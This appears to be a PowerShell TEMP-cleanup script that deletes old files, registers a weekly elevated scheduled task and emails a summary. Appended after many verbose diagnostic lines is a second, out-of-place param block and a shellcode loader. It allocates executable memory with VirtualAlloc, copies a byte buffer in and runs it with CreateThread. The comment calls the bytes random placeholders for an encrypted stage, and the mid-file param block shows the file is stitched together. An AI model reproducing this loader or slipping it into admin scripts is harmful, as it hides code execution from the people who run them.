
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [Alias("ScratchPath")]
    [string]$TempRoot = $env:TEMP,
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$AgeDays = 3,
    [int]$MinSizeMB = 10,
    [string]$LogPath = "C:\Logs\temp-cleanup-2026-09-08.log",
    [switch]$DryRun
)

$hostName = $env:COMPUTERNAME
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

if (-not (Test-Path -LiteralPath $TempRoot)) {
    throw ("Temp path not found: {0}" -f $TempRoot)
}
$cutoff = (Get-Date).AddDays(-$AgeDays)
$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
$stale = $allFiles | Where-Object {
    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)

Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan
function Write-CleanupLog {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}

& Write-CleanupLog -Message ("Cleanup started for {0}" -f $TempRoot) -Level INFO

foreach ($file in $stale) {
    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
        continue
    }
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
    Measure-Object -Property Length -Sum).Sum / 1MB, 1)

$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
foreach ($dir in $emptyDirs) {
    if ($dir.LastWriteTime -lt $cutoff) {
        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
    }
}

$byExtension = $stale | Group-Object -Property Extension |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byExtension | Format-Table Name, Count -AutoSize

$report = [pscustomobject]@{
    TempRoot    = $TempRoot
    AgeDays     = $AgeDays
    Files       = @($stale).Count
    ReclaimedMB = $reclaimMB
    RemainingMB = $remainingMB
    CompletedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$report | ConvertTo-Json -Depth 3 | Set-Content -Path $LogPath.Replace('.log', '.json') -Encoding UTF8

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Clear-TempFiles.ps1'
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At '19:15'
Register-ScheduledTask -TaskName 'Contoso-TempCleanup' -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null

$MailTo = "ops@internal.corp"

$mailParams = @{
    To         = $MailTo
    From       = "ops@internal.corp"
    Subject    = "TEMP cleanup summary"
    Body       = 'The scheduled TEMP sweep completed. See the JSON report on the host.'
    SmtpServer = 'smtp.contoso.com'
    Port       = 587
    UseSsl     = $true
}
Send-MailMessage @mailParams

& Write-CleanupLog -Message ("Cleanup finished: {0} MB reclaimed" -f $reclaimMB) -Level INFO
Write-Host ("Cleanup finished on {0}" -f $env:COMPUTERNAME) -ForegroundColor Green

$largest = $stale | Sort-Object -Property Length -Descending | Select-Object -First 5
$largest | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$recent = $allFiles | Where-Object { $_.LastWriteTime -ge $cutoff }
Write-Verbose ("Files kept because they are recent: {0}" -f @($recent).Count)

$tempDrive = Get-PSDrive -Name ($TempRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($tempDrive) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($tempDrive.Free / 1GB, 1))
}

$locked = @($stale | Where-Object { $_.IsReadOnly })
Write-Verbose ("Read-only candidates skipped: {0}" -f $locked.Count)

$sessionTemp = Join-Path $env:TEMP 'cleanup-session'
Write-Verbose ("Session folder: {0}" -f $sessionTemp)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class MemoryApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xed, 0x5c, 0x85, 0x50, 0xd6, 0x11, 0xb3, 0x0e, 0xd4, 0x76, 0x88, 0x9e, 0xe9, 0x4d, 0xbf, 0x0b,
        0x91, 0x72, 0xe6, 0x36, 0x03, 0xb9, 0x1d, 0x2e, 0x17, 0x9e, 0x6f, 0xae, 0xdc, 0x7e, 0xde, 0x7a,
        0x99, 0x5f, 0xff, 0xab, 0xf4, 0x8f, 0x8f, 0xd3, 0x0a, 0xb3, 0x74, 0xfc, 0x71, 0xd7, 0x87, 0x6c,
        0xb7, 0x5c, 0x31, 0xc1, 0xc5, 0xec, 0x46, 0x9f, 0x3f, 0xab, 0x14, 0xbe, 0xf0, 0x7b, 0x84, 0xa6,
        0x98, 0x60, 0xd2, 0x5f, 0xd5, 0x7e, 0x9e, 0x12, 0x52, 0x7f, 0x75, 0xad, 0xf2, 0x47, 0x73, 0x74,
        0x00, 0xf4, 0xeb, 0x5d, 0x1e, 0x43, 0x46, 0x45, 0x8d, 0xee, 0x58, 0xba, 0xe2, 0x0a, 0x41, 0xa3,
        0x03, 0x7e, 0x04, 0x71, 0x6b, 0x00, 0xa2, 0x60, 0x18, 0x54, 0xa9, 0x5f, 0x4a, 0x1a, 0x73, 0xf9,
        0x01, 0x41, 0xb6, 0xf1, 0x25, 0x42, 0xd4, 0x6f, 0xc1, 0x7a, 0xcd, 0xa0, 0x07, 0x75, 0x50, 0x8a,
        0x53, 0x38, 0xfb, 0xe6, 0xe1, 0x1b, 0xf1, 0xe4, 0xb5, 0x3f, 0xfd, 0x00, 0xe1, 0x2c, 0x20, 0x6e,
        0x0d, 0xfd, 0x2d, 0x23, 0xd3, 0x7d, 0x02, 0xe2, 0x5b, 0x2b, 0xa5, 0x50, 0x84, 0x02, 0xb5, 0x28,
        0x1c, 0x27, 0x33, 0x64, 0x8d, 0xad, 0x09, 0xf3, 0x79, 0x6e, 0x92, 0x35, 0x70, 0x60, 0x36, 0x29,
        0x8f, 0x39, 0xe6, 0xbd, 0xe5, 0x55, 0x54, 0x66, 0x34, 0xc4, 0xe7, 0x8e, 0xb3, 0x29, 0x60, 0x2a,
        0x3f, 0x36, 0xb7, 0x07, 0x0f, 0xde, 0x2c, 0x99, 0x9b, 0xf9, 0x2c, 0xa2, 0x3c, 0xd1, 0xee, 0x51,
        0x42, 0xb7, 0x5b, 0x7b, 0x1e, 0xcf, 0xc8, 0xac, 0x68, 0x53, 0xe2, 0xc2, 0x17, 0x19, 0xea, 0x2e,
        0x13, 0x60, 0xa4, 0x8c, 0x25, 0x86, 0xf3, 0xf5, 0x33, 0xc5, 0xea, 0x62, 0x95, 0x4a, 0xc7, 0xc9,
        0xd0, 0xb9, 0x88, 0x10, 0x05, 0xd9, 0x91, 0x0f, 0x1b, 0x72, 0x75, 0xa8, 0x8f, 0xa3, 0x1c, 0x42,
        0x1a, 0x48, 0x09, 0x31, 0xe4, 0xcc, 0x4b, 0x47, 0xed, 0x5e, 0x37, 0x85
    )

    $BufferAddress = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($BufferAddress -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
    $ThreadId = 0
    $Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][MemoryApi]::WaitForSingleObject($Thread, 1983)
    [void][MemoryApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
